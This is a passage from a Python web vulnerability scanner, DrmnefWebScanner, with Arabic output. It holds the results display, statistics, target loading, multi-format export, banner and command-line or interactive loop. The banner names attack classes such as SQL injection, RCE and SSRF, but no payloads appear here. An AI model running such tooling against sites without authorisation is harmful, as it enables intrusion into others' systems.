            return f"{Color.YELLOW}[ℹ] لم يتم اكتشاف أي ثغرات حرجة{Color.RESET}"
        
        output = f"{Color.RED}{Color.BOLD}╔══════════════════════════════════════════════════════════════╗\n"
        output += f"║            الثغرات الحرجة ({len(critical_vulns)})             ║\n"
        output += f"╚══════════════════════════════════════════════════════════════╝{Color.RESET}\n\n"
        
        for i, vuln in enumerate(critical_vulns, 1):
            output += f"{i}. {vuln['type']}\n"
            output += f"   المعلمة: {vuln['parameter']}\n"
            output += f"   الرابط: {vuln['url']}\n"
            output += f"   الحمولة: {vuln['payload'][:50]}...\n"
            output += f"   التفاصيل: {vuln['details']}\n\n"
        
        return output
    
    def _show_high_vulnerabilities(self):
        """عرض الثغرات عالية الخطورة"""
        high_vulns = self.scan_results.get('high_vulnerabilities', [])
        
        if not high_vulns:
            return f"{Color.YELLOW}[ℹ] لم يتم اكتشاف أي ثغرات عالية{Color.RESET}"
        
        output = f"{Color.RED}{Color.BOLD}╔══════════════════════════════════════════════════════════════╗\n"
        output += f"║            الثغرات العالية ({len(high_vulns)})             ║\n"
        output += f"╚══════════════════════════════════════════════════════════════╝{Color.RESET}\n\n"
        
        for i, vuln in enumerate(high_vulns, 1):
            output += f"{i}. {vuln['type']}\n"
            output += f"   المعلمة: {vuln['parameter']}\n"
            output += f"   الرابط: {vuln['url']}\n"
            output += f"   الحمولة: {vuln['payload'][:50]}...\n"
            output += f"   التفاصيل: {vuln['details']}\n\n"
        
        return output
    
    def _show_discovered_endpoints(self):
        """عرض النقاط المكتشفة"""
        output = f"{Color.CYAN}{Color.BOLD}╔══════════════════════════════════════════════════════════════╗\n"
        output += f"║            النقاط المكتشفة                   ║\n"
        output += f"╚══════════════════════════════════════════════════════════════╝{Color.RESET}\n\n"
        
        output += f"{Color.YELLOW}{Color.BOLD}📊 الإحصائيات:{Color.RESET}\n"
        output += f"• المعاملات: {len(self.discovered_params)}\n"
        output += f"• النماذج: {len(self.discovered_forms)}\n"
        output += f"• نقاط API: {len(self.discovered_apis)}\n"
        output += f"• ملفات JavaScript: {len(self.discovered_js)}\n\n"
        
        if self.discovered_params:
            output += f"{Color.YELLOW}{Color.BOLD}🎯 أهم المعاملات:{Color.RESET}\n"
            for param in self.discovered_params[:10]:
                output += f"• {param['parameter']} - {param['url'][:60]}...\n"
        
        return output
    
    def get_server_info(self, args=None):
        """الحصول على معلومات السيرفر"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        return self.test_connection()
    
    def show_stats(self, args=None):
        """عرض إحصائيات المسح"""
        elapsed = 0
        if self.stats['start_time']:
            if self.stats['end_time']:
                elapsed = self.stats['end_time'] - self.stats['start_time']
            else:
                elapsed = time.time() - self.stats['start_time']
        
        output = f"{Color.CYAN}{Color.BOLD}📈 إحصائيات المسح:{Color.RESET}\n"
        output += f"{Color.CYAN}{'─' * 50}{Color.RESET}\n"
        output += f"{Color.YELLOW}🎯 الهدف:{Color.RESET} {self.target_url or 'غير محدد'}\n"
        
        if self.stats['start_time']:
            output += f"{Color.YELLOW}🕐 وقت البدء:{Color.RESET} {time.ctime(self.stats['start_time'])}\n"
        
        if self.stats['end_time']:
            output += f"{Color.YELLOW}🕓 وقت الانتهاء:{Color.RESET} {time.ctime(self.stats['end_time'])}\n"
        
        output += f"{Color.YELLOW}⏱️  المدة:{Color.RESET} {elapsed:.2f} ثانية\n"
        output += f"{Color.YELLOW}📊 عدد الطلبات:{Color.RESET} {self.stats['total_requests']:,}\n"
        
        if elapsed > 0:
            output += f"{Color.YELLOW}⚡ سرعة الطلبات:{Color.RESET} {(self.stats['total_requests'] / elapsed):.2f} طلب/ثانية\n"
        
        output += f"{Color.YELLOW}🎯 المعاملات المكتشفة:{Color.RESET} {len(self.discovered_params)}\n"
        output += f"{Color.YELLOW}📝 النماذج المكتشفة:{Color.RESET} {len(self.discovered_forms)}\n"
        output += f"{Color.YELLOW}⚠️  الثغرات المكتشفة:{Color.RESET} {self.stats['vulnerabilities_found']}\n"
        
        if self.stats['vulnerabilities_found'] > 0:
            output += f"\n{Color.YELLOW}📋 توزيع الثغرات:{Color.RESET}\n"
            output += f"{Color.RED}• حرجة: {self.stats['critical_count']}{Color.RESET}\n"
            output += f"{Color.RED}• عالية: {self.stats['high_count']}{Color.RESET}\n"
            output += f"{Color.YELLOW}• متوسطة: {self.stats['medium_count']}{Color.RESET}\n"
            output += f"{Color.CYAN}• منخفضة: {self.stats['low_count']}{Color.RESET}\n"
        
        return output
    
    def show_config(self, args=None):
        """عرض إعدادات المسح"""
        output = f"{Color.CYAN}{Color.BOLD}⚙️ إعدادات المسح:{Color.RESET}\n"
        output += f"{Color.CYAN}{'─' * 50}{Color.RESET}\n"
        output += f"{Color.YELLOW}🎯 الهدف:{Color.RESET} {self.target_url or 'غير محدد'}\n"
        output += f"{Color.YELLOW}🧵 عدد الثريدات:{Color.RESET} {self.threads}\n"
        output += f"{Color.YELLOW}⏱️  مهلة الاتصال:{Color.RESET} {self.timeout} ثانية\n"
        output += f"{Color.YELLOW}📏 عمق الزحف:{Color.RESET} {self.scan_depth}\n"
        output += f"{Color.YELLOW}⏳ التأخير:{Color.RESET} {self.delay} ثانية\n"
        output += f"{Color.YELLOW}📈 الحد الأقصى للطلبات:{Color.RESET} {self.max_requests}\n"
        output += f"{Color.YELLOW}🔄 متابعة إعادة التوجيه:{Color.RESET} {'نعم' if self.follow_redirects else 'لا'}\n"
        output += f"{Color.YELLOW}🗣️  وضع التفصيل:{Color.RESET} {'مفعل' if self.verbose else 'معطل'}\n"
        output += f"{Color.YELLOW}🌐 البروكسي:{Color.RESET} {self.proxies or 'غير محدد'}\n"
        
        return output
    
    # ============================================
    # حفظ وتصدير النتائج
    # ============================================
    
    def load_targets(self, args):
        """تحميل قائمة أهداف من ملف"""
        if not args:
            return f"{Color.RED}[✗] الرجاء تحديد اسم الملف{Color.RESET}"
        
        filename = args[0]
        
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                targets = []
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if not line.startswith(('http://', 'https://')):
                            line = 'https://' + line
                        targets.append(line)
            
            if not targets:
                return f"{Color.YELLOW}[ℹ] الملف لا يحتوي على أهداف{Color.RESET}"
            
            self.target_url = targets[0]
            self.target_domain = urlparse(targets[0]).netloc
            
            return f"{Color.GREEN}[✓] تم تحميل {len(targets)} هدف، تم تعيين الهدف: {targets[0]}{Color.RESET}"
        
        except FileNotFoundError:
            return f"{Color.RED}[✗] الملف غير موجود: {filename}{Color.RESET}"
        except Exception as e:
            return f"{Color.RED}[✗] خطأ في تحميل الملف: {str(e)}{Color.RESET}"
    
    def save_results(self, args):
        """حفظ النتائج في ملف"""
        if not args:
            return f"{Color.RED}[✗] الرجاء تحديد اسم الملف{Color.RESET}"
        
        filename = args[0]
        
        try:
            results = {
                'tool': 'DrmnefWebScanner',
                'version': '3.0',
                'scan_date': datetime.now().isoformat(),
                'target': self.target_url,
                'vulnerabilities': self.scan_results.get('vulnerabilities', []),
                'stats': self.stats,
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False, default=str)
            
            file_size = os.path.getsize(filename)
            
            return f"{Color.GREEN}[✓] تم حفظ النتائج في: {filename} ({file_size:,} بايت){Color.RESET}"
        
        except Exception as e:
            return f"{Color.RED}[✗] خطأ في حفظ النتائج: {str(e)}{Color.RESET}"
    
    def export_results(self, args):
        """تصدير النتائج بصيغ مختلفة"""
        if not args:
            return f"{Color.RED}[✗] الرجاء تحديد الصيغة (json/txt/html/csv){Color.RESET}"
        
        fmt = args[0].lower()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if fmt == "json":
            filename = f"drmnefweb_scan_{timestamp}.json"
            return self.save_results([filename])
        
        elif fmt == "txt":
            filename = f"drmnefweb_scan_{timestamp}.txt"
            return self._export_txt(filename)
        
        elif fmt == "html":
            return self._export_html(timestamp)
        
        elif fmt == "csv":
            filename = f"drmnefweb_scan_{timestamp}.csv"
            return self._export_csv(filename)
        
        else:
            return f"{Color.RED}[✗] صيغة غير مدعومة: {fmt}{Color.RESET}"
    
    def _export_txt(self, filename):
        """تصدير إلى نص"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"DrmnefWebScanner - نتائج المسح\n")
                f.write(f"الهدف: {self.target_url}\n")
                f.write(f"التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                f.write("الثغرات المكتشفة:\n")
                f.write("-" * 50 + "\n")
                
                for i, vuln in enumerate(self.scan_results.get('vulnerabilities', []), 1):
                    f.write(f"{i}. {vuln['type']}\n")
                    f.write(f"   الخطورة: {vuln['severity']}\n")
                    f.write(f"   الرابط: {vuln['url']}\n")
                    f.write(f"   المعلمة: {vuln['parameter']}\n")
                    f.write(f"   الحمولة: {vuln['payload']}\n")
                    f.write(f"   التفاصيل: {vuln['details']}\n")
                    f.write(f"   الحالة: {vuln['response_code']}\n")
                    f.write(f"   الوقت: {vuln.get('discovery_time', '')}\n")
                    f.write("-" * 30 + "\n")
            
            file_size = os.path.getsize(filename)
            return f"{Color.GREEN}[✓] تم التصدير إلى: {filename} ({file_size:,} بايت){Color.RESET}"
        
        except Exception as e:
            return f"{Color.RED}[✗] خطأ في التصدير: {str(e)}{Color.RESET}"
    
    def _export_html(self, timestamp):
        """تصدير إلى HTML"""
        filename = f"drmnefweb_scan_{timestamp}.html"
        
        try:
            vulnerabilities = self.scan_results.get('vulnerabilities', [])
            total = len(vulnerabilities)
            
            html_content = '''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DrmnefWebScanner - نتائج المسح</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .header {
            background: #4CAF50;
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
        }
        .vulnerability {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 10px;
        }
        .critical { border-right: 5px solid #dc3545; }
        .high { border-right: 5px solid #fd7e14; }
        .medium { border-right: 5px solid #ffc107; }
        .low { border-right: 5px solid #17a2b8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>DrmnefWebScanner - نتائج المسح</h1>
            <p>أداة مسح ثغرات تطبيقات الويب المتقدمة</p>
        </div>'''
            
            html_content += f'''
        <h2>معلومات المسح</h2>
        <p><strong>الهدف:</strong> {self.target_url}</p>
        <p><strong>التاريخ:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>عدد الثغرات:</strong> {total}</p>'''
            
            if vulnerabilities:
                html_content += '''
        <h2>الثغرات المكتشفة</h2>'''
                
                for i, vuln in enumerate(vulnerabilities, 1):
                    severity_class = {
                        SeverityLevel.CRITICAL: 'critical',
                        SeverityLevel.HIGH: 'high',
                        SeverityLevel.MEDIUM: 'medium',
                        SeverityLevel.LOW: 'low'
                    }.get(vuln['severity'], 'medium')
                    
                    html_content += f'''
        <div class="vulnerability {severity_class}">
            <h3>ثغرة #{i}: {vuln['type']}</h3>
            <p><strong>الخطورة:</strong> {vuln['severity']}</p>
            <p><strong>الرابط:</strong> {vuln['url']}</p>
            <p><strong>المعلمة:</strong> {vuln['parameter']}</p>
            <p><strong>الحمولة:</strong> {html.escape(vuln['payload'][:100])}</p>
            <p><strong>التفاصيل:</strong> {vuln['details']}</p>
        </div>'''
            
            html_content += '''
    </div>
</body>
</html>'''
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            file_size = os.path.getsize(filename)
            return f"{Color.GREEN}[✓] تم التصدير إلى: {filename} ({file_size:,} بايت){Color.RESET}"
        
        except Exception as e:
            return f"{Color.RED}[✗] خطأ في إنشاء ملف HTML: {str(e)}{Color.RESET}"
    
    def generate_report(self, args=None):
        """إنشاء تقرير مفصل"""
        return self.export_results(['html'])
    
    def exit_scanner(self, args=None):
        """الخروج من الماسح الضوئي"""
        print(f"{Color.YELLOW}[*] جاري الخروج...{Color.RESET}")
        
        vulnerabilities = self.scan_results.get('vulnerabilities', [])
        if vulnerabilities:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            auto_save_file = f"drmnefweb_autosave_{timestamp}.json"
            self.save_results([auto_save_file])
            print(f"{Color.GREEN}[✓] تم الحفظ التلقائي في: {auto_save_file}{Color.RESET}")
        
        print(f"{Color.GREEN}[✓] تم إنهاء البرنامج{Color.RESET}")
        print(f"{Color.CYAN}[*] شكرًا لاستخدامك DrmnefWebScanner{Color.RESET}")
        sys.exit(0)

def display_banner():
    """عرض بانر البرنامج"""
    banner = f"""{Color.CYAN}{Color.BOLD}
                     ______                            ___   
                    (______)                          / __)  
                     _     _ ____ ____  ____  _____ _| |__   
                    | |   | / ___)    \\|  _ \\| ___ (_   __)  
                    | |__/ / |   | | | | | | | ____| | |     
                    |_____/|_|   |_|_|_|_| |_|_____) |_|     
                       Web Vulnerability Scanner v3.0                 
                         DrmnefWebScanner - متعدد الثغرات    {Color.RESET}

{Color.YELLOW}📋 المميزات المتقدمة:{Color.RESET}
• فحص SQL Injection, RCE, XSS, File Upload
• فحص LFI, RFI, SSRF, XXE, IDOR, CSRF, SSTI
• زحف ذكي متقدم لاكتشاف النقاط المحتملة
• تقارير متعددة التنسيقات

{Color.GREEN}💡 اكتب 'help' لعرض الأوامر المتاحة{Color.RESET}
{Color.CYAN}🌐 النسخة: 3.0 | المؤلف: Drmnef (Mnefal Alenzi){Color.RESET}
{Color.MAGENTA}⚠️  للاستخدام الأخلاقي فقط - احصل على إذن قبل الاختبار{Color.RESET}
"""
    print(banner)

def main():
    """الدالة الرئيسية"""
    scanner = WebVulnerabilityScanner()
    
    display_banner()
    
    # معالجة سطر الأوامر
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='DrmnefWebScanner - Advanced Web Vulnerability Scanner')
        parser.add_argument('--target', '-t', help='Target URL')
        parser.add_argument('--scan', '-s', action='store_true', help='Start full vulnerability scan')
        parser.add_argument('--threads', '-th', type=int, default=20, help='Number of threads')
        parser.add_argument('--timeout', '-to', type=int, default=10, help='Request timeout')
        parser.add_argument('--output', '-o', help='Output file')
        parser.add_argument('--format', '-f', choices=['json', 'html', 'txt', 'csv'], default='json', help='Output format')
        parser.add_argument('--proxy', '-p', help='Proxy URL')
        parser.add_argument('--verbose', '-v', action='store_true', help='Verbose mode')
        parser.add_argument('--quick', '-q', action='store_true', help='Quick scan')
        
        args = parser.parse_args()
        
        if args.target:
            scanner.set_parameter(['target', args.target])
        
        if args.threads:
            scanner.set_parameter(['threads', str(args.threads)])
        
        if args.timeout:
            scanner.set_parameter(['timeout', str(args.timeout)])
        
        if args.proxy:
            scanner.set_parameter(['proxy', args.proxy])
        
        if args.verbose:
            scanner.set_parameter(['verbose', 'true'])
        
        if args.target and args.scan:
            if args.quick:
                scanner.advanced_scan()
            else:
                scanner.start_full_scan()
            
            if args.output:
                scanner.export_results([args.format])
            
            return
    
    # الواجهة التفاعلية
    while True:
        try:
            prompt = f"\n{Color.GREEN}DrmnefWebScanner"
            if scanner.target_url:
                domain = scanner.target_domain
                if len(domain) > 20:
                    domain = domain[:17] + '...'
                prompt += f"[{domain}]"
            prompt += f"{Color.RESET} > "
            
            command = input(prompt).strip()
            
            if not command:
                continue
            
            parts = command.split()
            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            
            if cmd in scanner.commands:
                try:
                    result = scanner.commands[cmd](args)
                    if result:
                        print(result)
                except KeyboardInterrupt:
                    print(f"\n{Color.YELLOW}[!] تم إلغاء العملية{Color.RESET}")
                except Exception as e:
                    print(f"{Color.RED}[✗] خطأ: {str(e)}{Color.RESET}")
            else:
                print(f"{Color.RED}[✗] أمر غير معروف: {cmd}{Color.RESET}")
                print(f"{Color.YELLOW}[?] اكتب 'help' لعرض الأوامر المتاحة{Color.RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[!] للخروج اكتب 'exit' أو 'quit'{Color.RESET}")
        
        except EOFError:
            print(f"\n{Color.YELLOW}[*] جاري الخروج...{Color.RESET}")
            scanner.exit_scanner()
            break

if __name__ == "__main__":
    main()